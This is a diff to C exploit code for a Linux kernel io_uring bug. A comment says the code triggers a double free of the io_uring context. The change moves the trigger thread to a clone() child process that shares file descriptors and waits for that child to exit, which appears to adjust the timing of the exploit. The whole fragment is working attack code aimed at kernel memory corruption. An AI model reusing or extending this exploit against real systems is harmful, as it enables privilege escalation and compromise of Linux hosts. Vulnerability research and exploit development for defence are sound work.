@@ -506,11 +506,12 @@ typedef struct {
   // pthread_barrier_t setup_done_barrier;
   // pthread_barrier_t trigger_barrier;
   char *buf;
+  pid_t pid;
 } Context;
 
 Context context = { 0 };
 
-void *trigger_thread(void *arg) {
+int trigger_thread(void *arg) {
   pin_to_cpu(0);
   
   SYSCHK(read(context.pipe_to_thread[0], context.buf, 1));
@@ -537,7 +538,7 @@ void *trigger_thread(void *arg) {
   SYSCHK(read(context.pipe_to_thread[0], context.buf, 1));
   // after trigger barrier hit, exit thread which triggers double free of io_uring context in current task
 
-  return NULL;
+  return 0;
 }
 
 void setup_bug() {
@@ -560,7 +561,26 @@ void setup_bug() {
   context.io_uring = io_uring_setup();
 
   // spawn other thread before allocating io uring stuff
-  pthread_create(&context.trigger_thread, NULL, trigger_thread, NULL);
+  //pthread_create(&context.trigger_thread, NULL, trigger_thread, NULL);
+  const int STACK_SIZE = 1024 * 1024;
+  char *stack = malloc(STACK_SIZE);
+  if (!stack) {
+      perror("malloc");
+      exit(EXIT_FAILURE);
+  }
+
+  // Flags: share files, separate memory
+  int flags = CLONE_FILES | SIGCHLD;
+
+  pid_t pid = clone(trigger_thread, stack + STACK_SIZE, flags, NULL);
+  if (pid == -1) {
+      perror("clone");
+      free(stack);
+      exit(EXIT_FAILURE);
+  }
+
+  printf("Parent: created child with PID %d\n", pid);
+  context.pid = pid;
 
   // have other thread submit read
   SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));
@@ -586,6 +606,8 @@ void setup_bug() {
 void trigger_bug() {
   io_uring_enter_poll(&context.io_uring, 2);
   SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));
+  waitpid(context.pid, NULL, 0);
+  printf("Other pid exited\n");
 }
 
 void trigger_process(int start_step_pipes[2], int end_step_pipes[2]) {
